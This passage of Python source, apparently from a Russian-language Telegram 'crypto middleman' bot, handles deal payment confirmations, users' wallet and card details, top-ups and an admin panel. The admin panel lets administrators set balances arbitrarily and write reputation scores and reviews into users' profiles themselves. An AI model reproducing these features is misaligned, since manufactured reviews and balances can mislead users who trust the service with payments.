        await callback.answer("✅ Уведомление отправлено менеджеру!", show_alert=True)
        await callback.message.answer(L(uid, "paid_confirm"), parse_mode="HTML", reply_markup=back_kb(uid))
        return

    deal = deals.get(deal_id)
    if not deal:
        await callback.answer("❌ Сделка не найдена", show_alert=True)
        return

    amount = deal.get("amount", "—")
    currency = deal.get("currency", "—")

    # Уведомляем каждого админа с кнопками подтвердить/отклонить
    for admin_id in ADMIN_IDS:
        notify_text = L(admin_id, "paid_notify_admin", deal_id=deal_id, user=uname, amount=amount, currency=currency)
        await bot.send_message(
            admin_id,
            notify_text,
            parse_mode="HTML",
            reply_markup=admin_deal_confirm_kb(deal_id, uid)
        )

    # Уведомляем продавца
    seller_uid = deal.get("uid")
    if seller_uid and seller_uid != uid:
        try:
            await bot.send_message(
                seller_uid,
                L(seller_uid, "paid_notify_seller", deal_id=deal_id),
                parse_mode="HTML"
            )
        except Exception:
            pass

    await callback.answer("✅ Уведомление отправлено!", show_alert=True)
    await callback.message.answer(L(uid, "paid_confirm"), parse_mode="HTML", reply_markup=back_kb(uid))


# ===================== АДМИН: ПОДТВЕРДИТЬ ОПЛАТУ =====================
@dp.callback_query(F.data.startswith("adm_ok_"))
async def adm_confirm_deal(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return

    raw = callback.data.replace("adm_ok_", "")
    # deal_id может содержать буквы и цифры, buyer_uid — только цифры в конце
    parts = raw.rsplit("_", 1)
    deal_id = parts[0]
    buyer_uid = int(parts[1])

    deal = deals.get(deal_id)
    if deal:
        deal["status"] = "completed"

    # Уведомляем покупателя
    try:
        await bot.send_message(
            buyer_uid,
            L(buyer_uid, "deal_confirmed_user", deal_id=deal_id),
            parse_mode="HTML",
            reply_markup=back_kb(buyer_uid)
        )
    except Exception:
        pass

    # Уведомляем продавца
    if deal:
        seller_uid = deal.get("uid")
        if seller_uid and seller_uid != buyer_uid:
            try:
                await bot.send_message(
                    seller_uid,
                    f"✅ <b>Оплата по сделке <code>{deal_id}</code> подтверждена менеджером!</b>\n\nСделка успешно завершена.",
                    parse_mode="HTML",
                    reply_markup=back_kb(seller_uid)
                )
            except Exception:
                pass

    admin_name = f"@{callback.from_user.username}" if callback.from_user.username else f"ID:{callback.from_user.id}"
    try:
        await callback.message.edit_text(
            callback.message.text + f"\n\n✅ <b>Подтверждено: {admin_name}</b>",
            parse_mode="HTML"
        )
    except Exception:
        pass
    await callback.answer("✅ Оплата подтверждена!", show_alert=True)


# ===================== АДМИН: ОТКЛОНИТЬ ОПЛАТУ =====================
@dp.callback_query(F.data.startswith("adm_no_"))
async def adm_reject_deal(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return

    raw = callback.data.replace("adm_no_", "")
    parts = raw.rsplit("_", 1)
    deal_id = parts[0]
    buyer_uid = int(parts[1])

    # Уведомляем покупателя
    try:
        await bot.send_message(
            buyer_uid,
            L(buyer_uid, "deal_rejected_user", deal_id=deal_id),
            parse_mode="HTML",
            reply_markup=back_kb(buyer_uid)
        )
    except Exception:
        pass

    # Уведомляем продавца
    deal = deals.get(deal_id)
    if deal:
        seller_uid = deal.get("uid")
        if seller_uid and seller_uid != buyer_uid:
            try:
                await bot.send_message(
                    seller_uid,
                    f"❌ <b>Оплата по сделке <code>{deal_id}</code> отклонена менеджером.</b>\n\nОбратитесь в поддержку: @hostelman",
                    parse_mode="HTML",
                    reply_markup=back_kb(seller_uid)
                )
            except Exception:
                pass

    admin_name = f"@{callback.from_user.username}" if callback.from_user.username else f"ID:{callback.from_user.id}"
    try:
        await callback.message.edit_text(
            callback.message.text + f"\n\n❌ <b>Отклонено: {admin_name}</b>",
            parse_mode="HTML"
        )
    except Exception:
        pass
    await callback.answer("❌ Оплата отклонена!", show_alert=True)


@dp.callback_query(F.data.endswith("_deal") & F.data.startswith("req_"))
async def req_from_deal(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    req_type = callback.data.replace("req_", "").replace("_deal", "")
    key_map = {"ton": "enter_ton", "card": "enter_card", "stars": "enter_stars"}
    await safe_delete(callback.message)
    await callback.message.answer(L(uid, key_map[req_type]), parse_mode="HTML", reply_markup=cancel_kb(uid))
    state_map = {"ton": AddReq.ton, "card": AddReq.card, "stars": AddReq.stars}
    await state.set_state(state_map[req_type])
    await state.update_data(from_deal=True)
    await callback.answer()


@dp.callback_query(F.data == "requisites")
async def cb_req(callback: CallbackQuery):
    uid = callback.from_user.id
    u = get_user(uid)
    text = L(uid, "req_title", ton=u.get("ton_wallet") or "—", card=u.get("card") or "—", stars=u.get("username_stars") or "—")
    await safe_delete(callback.message)
    await callback.message.answer(text, parse_mode="HTML", reply_markup=req_kb(uid))
    await callback.answer()


@dp.callback_query(F.data == "req_ton")
async def cb_req_ton(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_delete(callback.message)
    await callback.message.answer(L(uid, "enter_ton"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(AddReq.ton)
    await callback.answer()


@dp.callback_query(F.data == "req_card")
async def cb_req_card(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_delete(callback.message)
    await callback.message.answer(L(uid, "enter_card"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(AddReq.card)
    await callback.answer()


@dp.callback_query(F.data == "req_stars")
async def cb_req_stars(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_delete(callback.message)
    await callback.message.answer(L(uid, "enter_stars"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(AddReq.stars)
    await callback.answer()


@dp.message(AddReq.ton)
async def save_ton(message: Message, state: FSMContext):
    uid = message.from_user.id
    _reg(message)
    get_user(uid).update({"ton_wallet": message.text, "has_requisites": True})
    data = await state.get_data()
    await safe_delete(message)
    await state.clear()
    suffix = L(uid, "redo_deal") if data.get("from_deal") else ""
    await message.answer(L(uid, "ton_saved") + suffix, parse_mode="HTML", reply_markup=main_kb(uid))


@dp.message(AddReq.card)
async def save_card(message: Message, state: FSMContext):
    uid = message.from_user.id
    _reg(message)
    get_user(uid).update({"card": message.text, "has_requisites": True})
    data = await state.get_data()
    await safe_delete(message)
    await state.clear()
    suffix = L(uid, "redo_deal") if data.get("from_deal") else ""
    await message.answer(L(uid, "card_saved") + suffix, parse_mode="HTML", reply_markup=main_kb(uid))


@dp.message(AddReq.stars)
async def save_stars(message: Message, state: FSMContext):
    uid = message.from_user.id
    _reg(message)
    get_user(uid).update({"username_stars": message.text, "has_requisites": True})
    data = await state.get_data()
    await safe_delete(message)
    await state.clear()
    suffix = L(uid, "redo_deal") if data.get("from_deal") else ""
    await message.answer(L(uid, "stars_saved") + suffix, parse_mode="HTML", reply_markup=main_kb(uid))


@dp.callback_query(F.data == "topup")
async def cb_topup(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_delete(callback.message)
    await callback.message.answer(L(uid, "topup_title"), parse_mode="HTML", reply_markup=topup_kb(uid))
    await callback.answer()


@dp.callback_query(F.data == "topup_stars")
async def cb_topup_stars(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_delete(callback.message)
    await callback.message.answer(L(uid, "topup_stars"), parse_mode="HTML", reply_markup=topup_paid_kb(uid))
    await callback.answer()


@dp.callback_query(F.data == "topup_ton")
async def cb_topup_ton(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_delete(callback.message)
    await callback.message.answer(L(uid, "topup_ton"), parse_mode="HTML", reply_markup=topup_paid_kb(uid))
    await callback.answer()


@dp.callback_query(F.data == "topup_card")
async def cb_topup_card(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_delete(callback.message)
    await callback.message.answer(L(uid, "topup_card"), parse_mode="HTML", reply_markup=topup_paid_kb(uid))
    await callback.answer()


@dp.callback_query(F.data == "topup_nft")
async def cb_topup_nft(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_delete(callback.message)
    await callback.message.answer(L(uid, "topup_nft"), parse_mode="HTML", reply_markup=topup_paid_kb(uid))
    await callback.answer()


@dp.callback_query(F.data == "withdraw")
async def cb_withdraw(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_delete(callback.message)
    await callback.message.answer(L(uid, "withdraw_text"), parse_mode="HTML", reply_markup=back_kb(uid))
    await callback.answer()


@dp.message(Command("adm"))
async def cmd_adm(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    await safe_delete(message)
    total = len([k for k in user_data if not str(k).startswith("_")])
    await message.answer(
        f"🔧 <b>Админ-панель | Crypto Middle</b>\n\n"
        f"👥 Пользователей: <b>{total}</b>\n"
        f"📋 Сделок: <b>{len(deals)}</b>",
        parse_mode="HTML", reply_markup=admin_kb())


@dp.callback_query(F.data == "adm_banner")
async def adm_banner(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await safe_delete(callback.message)
    await callback.message.answer(
        "📸 Отправьте <b>фото + подпись</b> для нового баннера.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="adm_cancel")]]))
    await state.set_state(SetBanner.waiting)
    await callback.answer()


@dp.message(SetBanner.waiting, F.photo)
async def save_banner(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    user_data["_banner"] = {"photo_id": message.photo[-1].file_id, "caption": message.caption or ""}
    await safe_delete(message)
    await message.answer("✅ Баннер обновлён!", reply_markup=admin_kb())
    await state.clear()


@dp.callback_query(F.data == "adm_stats")
async def adm_stats(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS: return
    total = len([k for k in user_data if not str(k).startswith("_")])
    with_req = len([v for k, v in user_data.items() if not str(k).startswith("_") and isinstance(v, dict) and v.get("has_requisites")])
    active = len([d for d in deals.values() if d.get("status") == "active"])
    completed = len([d for d in deals.values() if d.get("status") == "completed"])
    await callback.message.answer(
        f"📊 <b>Статистика</b>\n\n"
        f"👥 Всего: <b>{total}</b>\n"
        f"🧾 С реквизитами: <b>{with_req}</b>\n"
        f"📋 Сделок всего: <b>{len(deals)}</b>\n"
        f"🟢 Активных: <b>{active}</b>\n"
        f"✅ Завершённых: <b>{completed}</b>",
        parse_mode="HTML")
    await callback.answer()


@dp.callback_query(F.data == "adm_users")
async def adm_users(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS: return
    ulist = [k for k in user_data if not str(k).startswith("_")]
    text = f"👥 <b>Пользователи ({len(ulist)})</b>\n\n"
    for uid in ulist[:20]:
        u = user_data[uid]
        if not isinstance(u, dict): continue
        text += f"• <code>{uid}</code> | ⭐{u.get('reputation', 0)} | Сд:{u.get('deals_count', 0)} | {'✅' if u.get('has_requisites') else '❌'} | {u.get('lang', 'ru')}\n"
    if len(ulist) > 20:
        text += f"\n...ещё {len(ulist) - 20}"
    await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()


@dp.callback_query(F.data == "adm_reputation")
async def adm_rep(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.message.answer(
        "⭐️ <b>Выдача репутации</b>\n\nФормат: <code>@username +5</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="adm_cancel")]]))
    await state.set_state(AdminAction.reputation)
    await callback.answer()


@dp.message(AdminAction.reputation)
async def process_rep(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    try:
        parts = message.text.strip().split()
        uid = find_uid(parts[0])
        if uid is None:
            await message.answer("❌ Пользователь не найден.")
            await state.clear()
            return
        delta = int(parts[1])
        user = get_user(uid)
        user["reputation"] = user.get("reputation", 0) + delta
        await message.answer(f"✅ Репутация <code>{uid}</code>: {delta:+}\nИтого: <b>{user['reputation']} ⭐</b>", parse_mode="HTML")
        await bot.send_message(uid, f"⭐️ Ваша репутация изменена: <b>{delta:+}</b>\nТекущая: <b>{user['reputation']} ⭐</b>", parse_mode="HTML")
    except Exception:
        await message.answer("❌ Ошибка. Формат: <code>@username +5</code>", parse_mode="HTML")
    await state.clear()


@dp.callback_query(F.data == "adm_review")
async def adm_review(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.message.answer(
        "💬 <b>Добавить отзыв</b>\n\nФормат: <code>@username Текст</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="adm_cancel")]]))
    await state.set_state(AdminAction.review)
    await callback.answer()


@dp.message(AdminAction.review)
async def process_review(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    try:
        parts = message.text.strip().split(maxsplit=1)
        uid = find_uid(parts[0])
        if uid is None:
            await message.answer("❌ Пользователь не найден.")
            await state.clear()
            return
        get_user(uid).setdefault("reviews", []).append(parts[1])
        await message.answer(f"✅ Отзыв добавлен <code>{uid}</code>", parse_mode="HTML")
        await bot.send_message(uid, f"💬 <b>Новый отзыв:</b>\n\n{parts[1]}", parse_mode="HTML")
    except Exception:
        await message.answer("❌ Ошибка.")
    await state.clear()


@dp.callback_query(F.data == "adm_balance")
async def adm_bal(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.message.answer(
        "💰 <b>Изменить баланс</b>\n\nФормат: <code>@username 150.5</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="adm_cancel")]]))
    await state.set_state(AdminAction.balance)
    await callback.answer()


@dp.message(AdminAction.balance)
async def process_bal(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    try:
        parts = message.text.strip().split()
        uid = find_uid(parts[0])
        if uid is None:
            await message.answer("❌ Пользователь не найден.")
            await state.clear()
            return
        amount = float(parts[1])
        user = get_user(uid)
        old = user.get("balance", 0)
        user["balance"] = amount
        await message.answer(f"✅ Баланс <code>{uid}</code>: {old} → <b>{amount}</b>", parse_mode="HTML")
        await bot.send_message(uid, f"💰 Ваш баланс обновлён: <b>{amount}</b>", parse_mode="HTML")
    except Exception:
        await message.answer("❌ Ошибка.")
    await state.clear()


@dp.callback_query(F.data == "adm_deals")
async def adm_deals_cb(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS: return
    if not deals:
        await callback.message.answer("📋 Сделок пока нет.")
        await callback.answer()
        return
    text = f"📋 <b>Сделки ({len(deals)})</b>\n\n"
    for deal_id, d in list(deals.items())[-10:]:
        status_emoji = "✅" if d["status"] == "completed" else "🟢"
        text += (f"🆔 <code>{deal_id}</code> | 👤 {d['uid']} | 👥 {d.get('partner', '—')}\n"
                 f"💵 {d['amount']} {d['currency']} | {d['description'][:20]}\n"
                 f"{status_emoji} {d['status']}\n\n")
    await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()


@dp.callback_query(F.data == "adm_cancel")
async def adm_cancel(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.answer("❌ Отменено.", reply_markup=admin_kb())
    await callback.answer()


async def main():
    print("✅ Crypto Middle Bot запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
